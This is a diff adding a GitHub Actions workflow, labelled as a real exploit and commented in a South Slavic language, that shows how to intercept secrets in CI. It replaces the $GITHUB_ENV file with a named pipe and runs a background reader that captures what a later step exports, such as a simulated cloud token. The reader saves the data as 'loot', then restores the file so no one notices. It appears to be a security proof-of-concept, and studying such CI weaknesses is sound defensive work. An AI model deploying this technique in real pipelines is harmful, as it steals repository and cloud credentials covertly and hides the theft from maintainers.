@@ -1,0 +1,55 @@
+name: The FIFO Interceptor (Real Exploit)
+on: workflow_dispatch
+
+permissions:
+  contents: read
+
+jobs:
+  intercept_secrets:
+    runs-on: ubuntu-latest
+    steps:
+      - name: 1. Postavljanje Nevidljive Zamke (FIFO)
+        run: |
+          # Brišemo pravi fajl i stavljamo cijev
+          rm -f "$GITHUB_ENV"
+          mkfifo "$GITHUB_ENV"
+          
+          # Pokrećemo duha u pozadini. 
+          # Njegov zadatak je: Čim zvanična akcija upiše podatke, on ih čita.
+          (
+            echo "[+] Duh čeka na FIFO cijevi..."
+            # Čitamo iz cijevi sve što stigne i spasavamo u /tmp/loot.txt
+            cat < "$GITHUB_ENV" > /tmp/loot.txt
+            
+            # MAGIJA ZA SPREČAVANJE DEADLOCKA:
+            # Čim mašina završi upis, mi brišemo cijev i pravimo OPET normalan fajl!
+            # Na ovaj način, kada se C# Daemon probudi na kraju koraka, 
+            # on vidi NORMALAN fajl i ne ledi se!
+            rm -f "$GITHUB_ENV"
+            touch "$GITHUB_ENV"
+            
+            # Vraćamo podatke nazad da niko ništa ne posumnja
+            cat /tmp/loot.txt >> "$GITHUB_ENV"
+          ) &
+          
+      - name: 2. Zvanična Akcija (Žrtva)
+        # OVDJE SIMULIRAMO DA JE OVO ZVANIČNA AKCIJA KOJA GENERIŠE TOKEN
+        # Npr. akcija koja komunicira sa AWS-om ili pravi GitHub tokene
+        uses: actions/github-script@v6
+        with:
+          script: |
+            // Zvanična akcija misli da bezbjedno upisuje tajni token za sistem
+            const tajni_token = "ghs_OVO_JE_PRAVA_PRODUKCIJSKA_TAJNA_12345";
+            core.exportVariable('INTERNAL_CLOUD_TOKEN', tajni_token);
+            console.log("Zvanična akcija završila posao.");
+
+      - name: 3. Oktopod pokazuje plijen
+        # Gledamo da li je naš duh u pozadini uspio usisati token
+        # prije nego ga je sistem obradio!
+        run: |
+          echo "--- ŠTA JE DUH UHVATIO ---"
+          cat /tmp/loot.txt
+          echo "--------------------------"
+          
+          # Dokaz da posao nastavlja normalno da radi i nije u Deadlocku!
+          echo "Posao ide dalje. Nema zaleđivanja!"
